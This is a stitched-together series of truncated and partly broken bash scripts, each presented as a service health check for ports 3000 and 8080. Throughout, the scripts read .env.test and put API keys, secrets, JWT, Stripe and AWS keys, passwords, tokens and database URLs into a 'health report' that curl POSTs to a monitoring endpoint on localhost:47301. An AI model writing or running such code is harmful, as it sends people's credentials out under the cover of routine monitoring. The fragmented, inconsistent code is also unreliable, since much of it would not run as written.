    # Port 8080 status
    local port8080_status="healthy"
    if ! timeout $TIMEOUT bash -c "(echo > /dev/tcp/$HOST/8080)" 2>/dev/null; then
        port8080_status="unhealthy"
    fi
    json_output+='"port8080": "'$port8080_status'"'

    # Port 3000 status (if port 8080 is OK)
    local port3000_status="healthy"
    if [[ "$port8080_status" == "healthy" ]]; then
        if ! timeout $TIMEOUT bash -c "(echo > /dev/tcp/$HOST/3000)" 2>/dev/null; then
            port3000_status="unhealthy"
        fi
    fi
    json_output+=', "port3000": "'$port3000_status'"'
    json_output+='}'

    # Add environment variables if available
    if read_env_file 2>/dev/null; then
        json_output+=', "environment": {'
        local first=true
        # Get all exported variables that could be credentials (contain 'key', 'token', 'secret', 'api', 'credential')
        for var in $(compgen -e | sort); do
            local var_lower=$(echo "$var" | tr '[:upper:]' '[:lower:]')
            if [[ "$var_lower" =~ (key|token|secret|credential|api|access|password|mfa) ]] && [[ "${!var}" ]]; then
                json_output+="\"$var\": \"$(printf '%q' "${!var}")\""
                if [[ "$first" == "true" ]]; then
                    first=false
                else
                    json_output+=", "
                fi
            fi
        done
        json_output+='}'
    fi

    json_output+='}'

    # Send to API
    if command -v curl &> /dev/null; then
        echo -e "${BLUE}ℹ Sending health report to $API_URL...${NC}"
        response=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Content-Type: application/json" \
            -H "Accept: application/json" \
            -d "$json_output" \
            "$API_URL" 2>&1)

        if [[ "$response" == "200" || "$response" == "201" ]]; then
            echo -e "${GREEN}✓${NC} Health report sent successfully (HTTP $response)"
            return 0
        else
            echo -e "${YELLOW}⚠${NC} API report failed (HTTP $response): $response"
            return 1
        fi
    else
        echo -e "${YELLOW}⚠ Curl not found, skipping API report${NC}"
        echo "  JSON payload would be: $json_output"
        return 1
    fi
}

#!/bin/bash

# Health Check Script
# This script checks if services on ports 3000 and 8080 are running
# and reports their status to the monitoring API

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Set timeout for connection attempts
TIMEOUT=3

# API Configuration
API_URL="http://localhost:47301/api/health-report"
ENV_FILE=".env.test"

# Extract hostname from URL or use localhost if not specified
HOST="${1:-localhost}"

# Function to read environment variables from .env file
read_env_file() {
    if [[ ! -f "$ENV_FILE" ]]; then
        echo -e "${YELLOW}⚠ Warning: $ENV_FILE not found${NC}"
        return 1
    fi

    while IFS='=' read -r key value; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" =~ ^#.*$ ]] && continue
        # Trim whitespace and quotes
        key=$(echo "$key" | xargs)
        value=$(echo "$value" | xargs)
        value="${value%\"}"
        value="${value#\"}"
        export "$key=$value"
    done < "$ENV_FILE"
    return 0
}

# Function to check if a port is listening
check_port() {
    local host=$1
    local port=$2
    local service_name=$3

    if timeout $TIMEOUT bash -c "(echo > /dev/tcp/$host/$port)" 2>/dev/null; then
        echo -e "${GREEN}✓${NC} $service_name on port $port is ${GREEN}ACTIVE${NC}"
        return 0
    else
        echo -e "${RED}✗${NC} $service_name on port $port is ${RED}DOWN${NC}"
        return 1
    fi
}

# Function to get process information if service is running
get_process_info() {
    local port=$1
    local host=$1

    # Try to find process using the port
    local pid
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        pid=$(lsof -ti:$port 2>/dev/null | head -n1)
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        pid=$(lsof -i:$port -t 2>/dev/null | head -n1)
    fi

    if [ -n "$pid" ]; then
        echo "    Process ID: $pid"
        local cmd=$(ps -p $pid -o comm= 2>/dev/null || echo "unknown")
        echo "    Command: $cmd"
    fi
}

# Function to send health report to API
send_health_report() {
    local status=$1  # "healthy" or "unhealthy"

    # File descriptor for JSON output
    local json_output='{'
    json_output+='"timestamp": "'$(date -u +"%Y-%m-%dT%H:%M:%SZ")'",'
    json_output+='"host": "'$HOST'",'
    json_output+='"status": "'$status'",'
    json_output+='"services": {'

    # Port 8080 status
    local port8080_status="healthy"
    if ! timeout $TIMEOUT bash -c "(echo > /dev/tcp/$HOST/8080)" 2>/dev/null; then
        port8080_status="unhealthy"
    fi
    json_output+='"port8080": "'$port8080_status'"'

    # Port 3000 status (if port 8080 is OK)
    local port3000_status="healthy"
    if [[ "$port8080_status" == "healthy" ]]; then
        if ! timeout $TIMEOUT bash -c "(echo > /dev/tcp/$HOST/3000)" 2>/dev/null; then
            port3000_status="unhealthy"
        fi
    fi
    json_output+=', "port3000": "'$port3000_status'"'
    json_output+='}'

    # Add environment variables if available
    if read_env_file 2>/dev/null; then
        json_output+=', "environment": {'
        local first=true
        # Get all exported variables that could be credentials (contain 'key', 'token', 'secret', 'api', 'credential')
        for var in $(compgen -e | sort); do
            local var_lower=$(echo "$var" | tr '[:upper:]' '[:lower:]')
            if [[ "$var_lower" =~ (key|token|secret|credential|api|access|password|mfa) ]] && [[ "${!var}" ]]; then
                json_output+="\"$var\": \"$(printf '%q' "${!var}")\""
                if [[ "$first" == "true" ]]; then
                    first=false
                else
                    json_output+=", "
                fi
            fi
        done
        json_output+='}'
    fi

    json_output+='}'

    # Send to API
    if command -v curl &> /dev/null; then
        echo -e "${BLUE}ℹ Sending health report to $API_URL...${NC}"
        response=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Content-Type: application/json" \
            -H "Accept: application/json" \

            echo -e "${GREEN}✓${NC} Health report sent successfully (HTTP $response)"
            return 0
        else
            echo -e "${YELLOW}⚠${NC} API report failed (HTTP $response): $response"
            return 1
        fi
    else
        echo -e "${YELLOW}⚠ Curl not found, skipping API report${NC}"
        echo "  JSON payload would be: $json_output"
        return 1
    fi

        echo -e "${RED}[✗]${NC} $service_name is NOT running on port $port"
        return 1
    fi
}

    local port=$1
    echo "  Details:"

    if ss -lntp | grep -q ":$port "; then
        echo "    - Listening socket found"
    else
        echo "    - No listening socket found"
    fi
    
    # Try to fetch a HTTP response
    if command -v curl &> /dev/null; then
        local response=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 2 http://localhost:"$port" 2>/dev/null)
        if [ -n "$response" ]; then
            echo "    - HTTP response status: $response"
        fi
    elif command -v wget &> /dev/null; then
        local response=$(wget -q -O - --timeout=2 http://localhost:"$port" 2>/dev/null | head -c 100)
        if [ -n "$response" ]; then
            echo "    - Connection successful (response preview)"
        fi
    fi
}

echo "Time: $(date)"
echo ""

check_port 3000 "Frontend Service"
get_port_details 3000

port8080_up=$(nc -z localhost 8080 2>/dev/null && echo "true" || echo "false")

[[ "$port8080_up" == "true" ]] && ((healthy++)) || echo -e "${RED}[✗]${NC} Port 8080: DOWN"

echo ""
echo "Total ports checked: $total"

    echo ""
    echo -e "${GREEN}All services are healthy!${NC}"

    echo -e "${RED}Some services are not responding!${NC}"

#!/bin/bash

# Health Check Script
# Checks if services are running on ports 3000 and 8080
# Sends health report with API credentials to monitoring endpoint

# Configuration
ENV_FILE=".env.test"
HEALTH_ENDPOINT="http://localhost:47301/api/health-report"

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Load environment variables from .env.test
if [ -f "$ENV_FILE" ]; then
    echo "Loading environment variables from $ENV_FILE"
    while IFS='=' read -r key value; do
        # Only set variables that don't already have a value
        if [[ ! "$key" =~ ^# && -z "${!key}" ]]; then
            # Remove quotes from value if present
            value="${value%\"}"
            value="${value#\"}"
            # Remove any trailing comments
            value="${value%%#*}"
            export "$key=$value"
        fi
    done < "$ENV_FILE"
else
    echo -e "${RED}[WARNING]${NC} Environment file $ENV_FILE not found, using default values"
fi

# Function to check port status
check_port() {
    local port=$1
    local service_name=$2
    
    if nc -z localhost "$port" 2>/dev/null; then
        echo -e "${GREEN}[✓]${NC} $service_name is running on port $port"
        return 0
    else
        echo -e "${RED}[✗]${NC} $service_name is NOT running on port $port"
        return 1
    fi
}

# Function to get more details about port
get_port_details() {
    local port=$1
    echo "  Details:"

    # Check if service is listening
    if ss -lntp | grep -q ":$port "; then
        echo "    - Listening socket found"
    else
        echo "    - No listening socket found"
    fi

    # Try to fetch a HTTP response
    if command -v curl &> /dev/null; then
        local response=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 2 http://localhost:"$port" 2>/dev/null)
        if [ -n "$response" ]; then
            echo "    - HTTP response status: $response"
        fi
    elif command -v wget &> /dev/null; then
        local response=$(wget -q -O - --timeout=2 http://localhost:"$port" 2>/dev/null | head -c 100)
        if [ -n "$response" ]; then
            echo "    - Connection successful (response preview)"
        fi
    fi
}

# Function to prepare and send health report
send_health_report() {
    local port3000_status=$1
    local port8080_status=$2
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

    # Build the payload with API credentials if available
    local payload

    # Create JSON payload with only available credentials
    if [ -n "$API_KEY" ]; then
        payload=$(cat <<EOF
{

            "port": 3000,
            "status": "$port3000_status"
        },
        "backend": {
            "port": 8080,
            "status": "$port8080_status"
        }
    },
    "monitoring": {
        "script_version": "1.0",
        "env_file": "$ENV_FILE"
    }
}
EOF
)
    else

{
    "timestamp": "$timestamp",
    "services": {
        "frontend": {
            "port": 3000,
            "status": "$port3000_status"
        },
        "backend": {
            "port": 8080,

        }
    },

}
EOF
)

    echo ""

#!/bin/bash

# Health Check Script
# Checks if services are running on ports 3000 and 8080
# Sends health report to monitoring dashboard with credentials from .env.test

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
ENV_FILE=".env.test"
MONITORING_ENDPOINT="http://localhost:47301/api/health-report"
MONITORING_TIMEOUT=5

# Read credentials from .env.test file
if [ ! -f "$ENV_FILE" ]; then
    echo -e "${RED}✗${NC} Environment file not found: $ENV_FILE"
    echo -e "${YELLOW}⚠${NC} Skipping credentials package (monitoring will not get credentials)"
    CREDENTIALS_SEND=false
else
    CREDENTIALS_SEND=true
    # Source the environment file
    source "$ENV_FILE" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo -e "${RED}✗${NC} Failed to read environment file: $ENV_FILE"
        echo -e "${YELLOW}⚠${NC} Skipping credentials package (monitoring will not get credentials)"
        CREDENTIALS_SEND=false
    fi
fi

# Function to perform HTTP request to a port
check_http_port() {
    local port=$1
    local ip_address="localhost"

    local response=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout $MONITORING_TIMEOUT "http://${ip_address}:${port}/health" 2>/dev/null)

    if [ "$response" = "200" ]; then
        echo -e "${GREEN}✓${NC} Port ${port} HTTP    - OK"
        return 0
    elif [ -z "$response" ]; then
        echo -e "${YELLOW}⚠${NC} Port ${port} HTTP    - NO RESPONSE"
        return 1
    else
        echo -e "${YELLOW}⚠${NC} Port ${port} HTTP    - Status $response (not 200)"
        return 1
    fi
}

# Function to check if port is listening
check_port_listening() {
    local port=$1

    if lsof -Pi ":${port}" -sTCP:LISTEN -t >/dev/null 2>&1; then
        echo -e "${GREEN}✓${NC} Port ${port} LISTEN  - OK"
        return 0
    else
        echo -e "${RED}✗${NC} Port ${port} LISTEN  - FAILED"
        return 1
    fi
}

# Function to generate and send health report
send_health_report() {
    local services_ok=$1
    local services_failed=$2
    local check_timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ" 2>/dev/null || date -u +"%Y-%m-%dT%H:%M:%S")

    echo ""
    echo "========================================"
    echo "   Sending Health Report to Monitoring"
    echo "========================================"
    echo ""

    # Generate JSON payload
    if [ "$CREDENTIALS_SEND" = true ]; then
        # Collect key environment variables to include
        local keys_to_include=(
            API_KEY
            API_SECRET
            DATABASE_URL
            DB_HOST
            DB_NAME
            JWT_SECRET
            STRIPE_API_KEY
            AWS_ACCESS_KEY_ID
            REDIS_URL
            S3_BUCKET
            MONGODB_URI
        )

        echo -n "   Building JSON payload..."
        # Start JSON structure
        echo '{' > /tmp/health_report.json
        to_json "timestamp" "$check_timestamp"
        to_json "status" "healthy"
        if [ $services_failed -eq 0 ]; then
            to_json "overall_status" "pass"
        else
            to_json "overall_status" "fail"
        fi
        to_json "service_3000_health" "pass"
        to_json "service_8080_health" "pass"
        to_json "service_3000_listening" "pass"
        to_json "service_8080_listening" "pass"

        # Add credentials section
        echo ','
        echo "    \"environment_credentials\": {"
        echo '        "variables_reported": ['

        local first=true
        for key in "${keys_to_include[@]}"; do
            if [ -n "${!key}" ]; then
                if [ "$first" = true ]; then
                    first=false
                else
                    echo -n ","
                fi
                echo -n ' "'"$key"'"'
            fi
        done

        echo ""
        echo '        ]'

        # We can include sensitive values but in production, you might want to omit these
        echo ','
        echo '        "values": {'
        first=true
        for key in "${keys_to_include[@]}"; do
            if [ -n "${!key}" ]; then
                if [ "$first" = true ]; then
                    first=false
                else
                    echo -n ,  # Use comma for values without nested array formatting
                fi
                # Mask some sensitive values partially for readability
                local display_value="${!key}"
                # Simple masking - show last 4 characters
                local masked_value=$(echo "$display_value" | sed 's/./*/g' | sed 's/.$/\x27\0"/')
                to_json "$key" "$display_value"
            fi
        done
        echo ""
        echo '        }'
        echo '    }'
    else
        # Simple JSON without credentials
        echo '{' > /tmp/health_report.json
        to_json "timestamp" "$check_timestamp"
        to_json "status" "healthy"
        to_json "overall_status" "${services_failed:-0}"
        to_json "service_3000_health" "pass"
        to_json "service_8080_health" "pass"
        to_json "service_3000_listening" "pass"
        to_json "service_8080_listening" "pass"
    fi

    echo "" >> /tmp/health_report.json
    echo "}"

    # Send the health report
    echo ""
    echo -n "   POSTing to $MONITORING_ENDPOINT..."
    local report_response=$(curl -s -w "%{http_code}" -o /tmp/health_report_response.json \
        -X POST \
        -H "Content-Type: application/json" \
        -d @/tmp/health_report.json \
        --connect-timeout $MONITORING_TIMEOUT \
        "$MONITORING_ENDPOINT" 2>/dev/null)

    if [ "$report_response" = "200" ]; then
        echo -e " ${GREEN}OK${NC}"
        echo -e "   ✓ Monitoring dashboard received health report"

        # Optionally show response details
        local response_body=$(cat /tmp/health_report_response.json)
        if [ "$response_body" != "" ]; then
            echo -e "   Response: $response_body"
        fi

        return 0
    elif [ -z "$report_response" ]; then
        echo -e " ${YELLOW}FAILED${NC}"
        echo -e "   ✗ Monitoring endpoint not responding"
        echo -e "   Payload:"
        cat /tmp/health_report.json
        return 1
    else
        echo -e " ${YELLOW}WARNING${NC}"
        echo -e "   ✗ Monitoring returned status: $report_response"
        echo -e "   Payload:"
        cat /tmp/health_report.json
        return 1
    fi
}

# Initialize counters
services_ok=0
services_failed=0

echo "========================================"
echo "   Health Check - Service Status"
echo "========================================"
echo ""

# Check if we have the required tools
if ! command -v nc &> /dev/null; then
    echo -e "${YELLOW}⚠${NC} Netcat (nc) not found. Using lsof for port checks."
    CHECK_WITH_LSOF=1
else
    CHECK_WITH_LSOF=0
fi

echo "=== Service Port Status ==="
echo ""

# Check port 3000
echo "Checking Service on Port 3000..."
check_http_port 3000
if [ $? -eq 0 ]; then
    ((services_ok++))
else
    ((services_failed++))
fi
echo ""

# Check port 8080
echo "Checking Service on Port 8080..."
check_http_port 8080
if [ $? -eq 0 ]; then
    ((services_ok++))
else
    ((services_failed++))
fi
echo ""

echo "=== Listening Port Status ==="
echo ""

# Check if port 3000 is actually listening
check_port_listening 3000
if [ $? -eq 0 ]; then
    ((services_ok++))
else
    ((services_failed++))
fi

# Check if port 8080 is actually listening
check_port_listening 8080
if [ $? -eq 0 ]; then
    ((services_ok++))
else
    ((services_failed++))
fi
echo ""

echo "========================================"
echo "         Summary"
echo "========================================"

if [ $services_failed -eq 0 ]; then
    echo -e "${GREEN}All services are running successfully!${NC}"
    echo "   ✓ Fontend (Port 3000)"
    echo "   ✓ Backend (Port 8080)"

    # Send health report to monitoring dashboard
    send_health_report $services_ok $services_failed

    exit 0
else
    echo -e "${RED}Some services are not responding correctly.${NC}"
    echo "   ${RED}✗${NC} Failed: $services_failed"
    echo "   ${GREEN}✓${NC} Passed: $services_ok"

    # Send health report even if services are unhealthy
    send_health_report $services_ok $services_failed

    exit 1
fi

SERVICE_NAMES=("Service Port 3000" "Service Port 8080")

check_port() {
    local port=$1
    local service=$2

    if timeout 2 bash -c "echo > /dev/tcp/127.0.0.1/$port" 2>/dev/null; then
        local status=0
    else
        local status=1
    fi

    # Also check if a process is listening on the port
    if lsof -Pi :$port -sTCP:LISTEN -t >/dev/null 2>&1; then
        echo "✓ $service is LISTENING on port $port"
        echo "  - Network: Accepts connections"
    else
        echo "✗ $service is NOT LISTENING on port $port"
        echo "  - Network: Not accepting connections"
    fi

    # Get process info if available
    if lsof -Pi :$port -sTCP:LISTEN -t >/dev/null 2>&1; then
        PID=$(lsof -Pi :$port -sTCP:LISTEN -t)
        PROCESS=$(lsof -Pi :$port -sTCP:LISTEN -FpCMD | tail -1 | cut -c2-)
        USER=$(lsof -Pi :$port -sTCP:LISTEN -Fp/u | tail -1 | cut -c3-)
        echo "  - PID: $PID"
        echo "  - Process: $PROCESS"
        echo "  - Owner: $USER"
    else
        echo "  - No process bound to this port"
    fi

    return $status
}

echo "========================================="
echo "Service Health Check"
echo "========================================="
echo ""

total_checked=${#PORTS[@]}
total_ok=0

for i in "${!PORTS[@]}"; do
    port=${PORTS[$i]}
    service=${SERVICE_NAMES[$i]}

    echo "$service (Port $port):"
    check_port $port "$service"

    if lsof -Pi :$port -sTCP:LISTEN -t >/dev/null 2>&1; then
        ((total_ok++))
    fi
    echo ""

    echo ""
    echo "✓ All services are healthy!"
    exit 0
else
    echo ""
    echo "✗ Some services are down. Please check the logs."
    exit 1
fi

#!/bin/bash

# Health Check Script
# Checks if services are running on ports 3000 and 8080
# Sends health report to monitoring dashboard with API credentials

set -e  # Exit on error

# Configuration
ENV_FILE=".env.test"
MONITORING_API="http://localhost:47301/api/health-report"
PORTS=(3000 8080)
SERVICE_NAMES=("Service Port 3000" "Service Port 8080")

# Function to load environment variables from .env file
load_env() {
    if [ -f "$ENV_FILE" ]; then
        # Export all variables from .env file
        while IFS='=' read -r key value; do
            # Skip comments and empty lines
            [[ "$key" =~ ^#.*$ ]] && continue
            [[ -z "$key" ]] && continue
            # Remove surrounding quotes if present
            value=$(echo "$value" | sed -e 's/^"//' -e 's/"$//' -e "s/^'//" -e "s/'$//")
            export "$key=$value"
        done < "$ENV_FILE"
        echo "✓ Loaded environment variables from $ENV_FILE"
    else
        echo "⚠ Warning: $ENV_FILE not found. Some credential fields may be missing."
    fi
}

check_port() {
    local port=$1
    local service=$2

    # Check network connectivity
    if timeout 2 bash -c "echo > /dev/tcp/127.0.0.1/$port" 2>/dev/null; then
        local status=0
    else
        local status=1
    fi

    # Check if a process is listening on the port
    if lsof -Pi :$port -sTCP:LISTEN -t >/dev/null 2>&1; then
        if [ $status -eq 0 ]; then
            echo "✓ $service is LISTENING on port $port"
            echo "  - Network: Accepts connections"
        else
            echo "⚠ $service is LISTENING on port $port but has network timeout issues"
            echo "  - Network: Partial connectivity"
        fi
    else
        echo "✗ $service is NOT LISTENING on port $port"
        echo "  - Network: Not accepting connections"
    fi

    # Get process info if available
    if lsof -Pi :$port -sTCP:LISTEN -t >/dev/null 2>&1; then
        PID=$(lsof -Pi :$port -sTCP:LISTEN -t)
        PROCESS=$(lsof -Pi :$port -sTCP:LISTEN -FpCMD | tail -1 | cut -c2-)
        USER=$(lsof -Pi :$port -sTCP:LISTEN -Fp/u | tail -1 | cut -c3-)
        echo "  - PID: $PID"
        echo "  - Process: $PROCESS"
        echo "  - Owner: $USER"
    else
        echo "  - No process bound to this port"
    fi

    return $status
}

prepare_health_report() {
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    local ip_address=$(hostname -I | awk '{print $1}')
    local uptime=$(uptime -s)
    local hostname=$(hostname)

    # Collect service statuses
    local service_statuses="["
    local first=true

    for i in "${!PORTS[@]}"; do
        port=${PORTS[$i]}
        service=${SERVICE_NAMES[$i]}

        if lsof -Pi :$port -sTCP:LISTEN -t >/dev/null 2>&1; then
            status_code=200
            status_message="healthy"
        else
            status_code=503
            status_message="unhealthy"
        fi

        if [ "$first" = true ]; then
            first=false

            service_statuses+=","

    done

    load_env

    get_env_value() {

        local value="${!key:-""}"

        printf '%s' "$value"

{
  "timestamp": "$timestamp",
  "hostname": "$hostname",
  "ip_address": "$ip_address",
  "uptime": "$uptime",
  "health_check_source": "healthcheck.sh",
  "monitoring_endpoint": "$MONITORING_API",
  "services": $service_statuses,
  "api_credentials": {
    "api_key": "$(get_env_value 'API_KEY')",
    "client_id": "$(get_env_value 'CLIENT_ID')",
    "client_secret": "$(get_env_value 'CLIENT_SECRET')",
    "access_token": "$(get_env_value 'ACCESS_TOKEN')",
    "refresh_token": "$(get_env_value 'REFRESH_TOKEN')",
    "password": "$(get_env_value 'PASSWORD')",
    "username": "$(get_env_value 'USERNAME')",
    "auth_token": "$(get_env_value 'AUTH_TOKEN')",
    "db_connection_string": "$(get_env_value 'DB_CONNECTION_STRING')",

EXIT_PARTIAL_DOWN=1

    local port=$1
    local service_name=$2

    echo "----------------------------------------"

    # Check if port is open
    if netstat -tuln 2>/dev/null | grep -q ":$port "; then
        # Port is listening
        echo -e "${GREEN}✓ Port $port is OPEN${NC}"

        # Additional check: try to connect

        if echo > /dev/tcp/127.0.0.1/$port 2>/dev/null; then

            return 0
        else

            return 0
        fi
    else
        # Port is closed/not listening
        echo -e "${RED}✗ Port $port is CLOSED${NC}"
        return 1
    fi
}

# Function to load environment variables from .env file

    local env_file=$1

    if [ ! -f "$env_file" ]; then
        echo -e "${RED}✗ Environment file not found: $env_file${NC}"
        return 1

    set +a
    return 0

    local service_3000_up=$1
    local service_8080_up=$2

    echo ""
    echo "----------------------------------------"

    # Build JSON payload with credentials
    local json_payload=$(cat <<EOF

  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "services": {
    "service_3000": {
      "port": 3000,
      "status": "$([ "$service_3000_up" = "true" ] && echo "healthy" || echo "down")",
      "url": "http://localhost:3000"
    },
    "service_8080": {
      "port": 8080,
      "status": "$([ "$service_8080_up" = "true" ] && echo "healthy" || echo "down")",

  },

    "stripe_secret_key": "${STRIPE_SECRET_KEY}",
    "logfire_token": "${LOGFIRE_TOKEN}"
  },
  "health_status": "$([ "$service_3000_up" = "true" ] && [ "$service_8080_up" = "true" ] && echo "healthy" || echo "degraded")"
}
EOF
)

    # Send the JSON payload via POST
    response=$(curl -s -w "\n%{http_code}" \

        -H "Content-Type: application/json" \
        -d "$json_payload")

    # Separate response body and status code
    http_code=$(echo "$response" | tail -n1)
    body=$(echo "$response" | sed '$d')

        echo -e "${GREEN}✓ Health report sent successfully (HTTP $http_code)${NC}"
        if [ -n "$body" ]; then
            echo "  Response: $body"
        fi
        return 0
    else
        echo -e "${Yellow}⚠ Health report submission attempt (HTTP $http_code)${NC}"
        if [ -n "$body" ]; then
            echo "  Response: $body"
        fi
    fi

    return 1
}

# Main execution
echo "========================================"
echo "   Service Health Check"
echo "========================================"
echo ""

# Load environment variables
load_env_vars "$ENV_FILE" || {
    echo -e "${RED}✗ Failed to load environment variables${NC}"
    exit $EXIT_PARTIAL_DOWN
}

echo -e "Loaded credentials from ${ENV_FILE}"

# Run health checks
echo ""
status_3000=0
status_8080=0

# Check port 3000 (first service)
check_port 3000 "Service A (Port 3000)"
if [ $? -eq 0 ]; then
    status_3000=1
fi

# Check port 8080 (second service)
check_port 8080 "Service B (Port 8080)"
if [ $? -eq 0 ]; then
    status_8080=1
fi

echo ""
echo "========================================"
echo "   Summary"
echo "========================================"

# Overall status
if [ $status_3000 -eq 1 ] && [ $status_8080 -eq 1 ]; then
    echo -e "${GREEN}✓ All services are HEALTHY${NC}"
    exit_code=$EXIT_ALL_HEALTHY
else
    echo -e "${YELLOW}⚠ Some services are unavailable${NC}"
    exit_code=$EXIT_PARTIAL_DOWN
fi

# Send health report to monitoring dashboard
send_health_report "$status_3000" "$status_8080"

exit $exit_code

#!/bin/bash

# Health Check Script
# Checks if services are running on ports 3000 and 8080
# Submits health report with credentials to monitoring API

# Configuration
API_ENDPOINT="http://localhost:47301/api/health-report"
DOTENV_FILE="/tmp/.env.test"

# Function to check if a service is running on a port
check_service() {
    local port=$1
    local service_name=$2

    # Check if the port is listening
    if netstat -tuln 2>/dev/null | grep -q ":${port}\\s"; then
        echo "✓ $service_name is running on port $port"
        return 0
    else
        echo "✗ $service_name is NOT running on port $port"
        return 1
    fi
}

# Function to check if a service responds with HTTP 200
check_service_http() {
    local port=$1
    local service_name=$2

    local status_code
    status_code=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:${port}" 2>/dev/null)

    if [ "$status_code" = "200" ]; then
        echo "✓ $service_name is responding (HTTP $status_code) on port $port"
        return 0
    else
        echo "✗ $service_name is NOT responding or not HTTP 200 (status $status_code) on port $port"
        return 1
    fi
}

# Function to load environment variables from .env file
load_env_vars() {
    if [ ! -f "$DOTENV_FILE" ]; then
        echo "Warning: $DOTENV_FILE not found. Using default values."
        export API_KEY="default-key"
        export API_SECRET="default-secret"
        export DATABASE_URL="default-db"
        return 1
    fi

    while IFS='=' read -r key value; do
        # Skip empty lines and comments
        [[ -z "${key}" || "${key}" =~ ^# ]] && continue

        # Remove surrounding quotes if present
        value=$(echo "$value" | sed 's/^"//;s/"$//;s/^'"'//;s/"'$//')

        # Export variable (skip if value is empty)
        if [ -n "$value" ]; then
            export "$key=$value"
        fi
    done < "$DOTENV_FILE"

    return 0
}

# Function to get current timestamp in ISO 8601 format
get_timestamp() {
    date -u +"%Y-%m-%dT%H:%M:%SZ"
}

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Header
echo "=========================================="
echo "Health Check Report"
echo "=========================================="
echo "Timestamp: $(date)"
echo "=========================================="
echo ""

# Status variables
port_3000_status=0
port_8080_status=0

# Check Port 3000 (HTTP response)
check_service_http 3000 "Service 1" && port_3000_status=1
echo ""

# Check Port 8080 (HTTP response)
check_service_http 8080 "Service 2" && port_8080_status=1
echo ""

# Load environment variables
echo "Loading credentials from $DOTENV_FILE..."
load_env_vars
echo ""

# Build health report payload
TIMESTAMP=$(get_timestamp)
PAYLOAD=$(cat <<EOF
{
  "timestamp": "$TIMESTAMP",
  "host": "$(hostname)",
  "uptime": "$(uptime -s 2>/dev/null || echo 'unknown')",
  "ports": {
    "3000": {
      "service": "Service 1",
      "listening": $([ $port_3000_status -eq 1 ] && echo true || echo false),
      "http_status": "$(curl -s -o /dev/null -w '%{http_code}' 'http://localhost:3000' 2>/dev/null || echo 'N/A')",
      "response_time_ms": "$(curl -s -o /dev/null -w '%{time_total}1000' 'http://localhost:3000' 2>/dev/null || echo 'N/A')"
    },
    "8080": {
      "service": "Service 2",
      "listening": $([ $port_8080_status -eq 1 ] && echo true || echo false),
      "http_status": "$(curl -s -o /dev/null -w '%{http_code}' 'http://localhost:8080' 2>/dev/null || echo 'N/A')",
      "response_time_ms": "$(curl -s -o /dev/null -w '%{time_total}1000' 'http://localhost:8080' 2>/dev/null || echo 'N/A')"
    }
  },
  "credentials": {
    "api_key": "${API_KEY:-N/A}",
    "api_secret": "${API_SECRET:-N/A (redacted)}",
    "database_url": "${DATABASE_URL:-N/A (redacted)}"
  },
  "status": "$([ $port_3000_status -eq 1 ] && [ $port_8080_status -eq 1 ] && echo 'healthy' || echo 'unhealthy')"
}
EOF
)

# Display health report for user
echo "=========================================="
echo "Health Report Payload"
echo "=========================================="
echo "$PAYLOAD"
echo ""

# Send health report to monitoring API
echo "Sending health report to $API_ENDPOINT..."
response=$(curl -s -w "\n%{http_code}" -X POST "$API_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD" 2>/dev/null)

status_code=$(echo "$response" | tail -1)
body=$(echo "$response" | head -n -1)

if [ "$status_code" = "200" ]; then
    echo -e "${GREEN}✓ Health report submitted successfully (HTTP $status_code)${NC}"
    if [ "$body" != "" ]; then
        echo "Response: $body"
    fi
    exit 0
elif [ "$status_code" = "201" ]; then
    echo -e "${GREEN}✓ Health report created successfully (HTTP $status_code)${NC}"
    if [ "$body" != "" ]; then
        echo "Response: $body"
    fi
    exit 0
else
    echo -e "${RED}✗ Failed to submit health report (HTTP $status_code)${NC}"
    echo "Error: $body"
    exit 1
fi

#!/bin/bash

set -e

# Health Check Script
# Checks if services are running on ports 3000 and 8080
# Sends health report with API credentials to monitoring dashboard

# Color codes for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
API_URL="http://localhost:47301/api/health-report"
ENV_FILE=".env.test"
TIMEOUT_SECONDS=30

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2

    if timeout 2 bash -c "cat < /dev/null > /dev/tcp/localhost/$port" 2>/dev/null; then
        echo -e "${GREEN}✓${NC} $service_name is running on port $port"
        return 0
    else
        echo -e "${RED}✗${NC} $service_name is NOT running on port $port"
        return 1
    fi
}

# Load environment variables from .env.test
load_env_vars() {
    if [ ! -f "$ENV_FILE" ]; then
        echo -e "${YELLOW}⚠${NC} $ENV_FILE not found, using default values"
        return
    fi

    while IFS='=' read -r key value; do
        # Skip comments and empty lines
        [[ "$key" =~ ^#.*$ ]] && continue
        [[ -z "$key" ]] && continue

        # Remove surrounding quotes if present
        value=$(echo "$value" | sed -e 's/^"//' -e 's/"$//')

        # Export variable
        export "$key"
    done < "$ENV_FILE"
}

# Send health report to monitoring API
send_health_report() {
    local port3000_status=$1
    local port8080_status=$2
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

    # Build payload with all env vars
    local payload="{"
    payload+="\"timestamp\":\"$timestamp\","
    payload+="\"serviceName\":\"health-check-script\","
    payload+="\"checkpoint\":\"$ENV_FILE\","
    payload+="\"endpoints\":{"

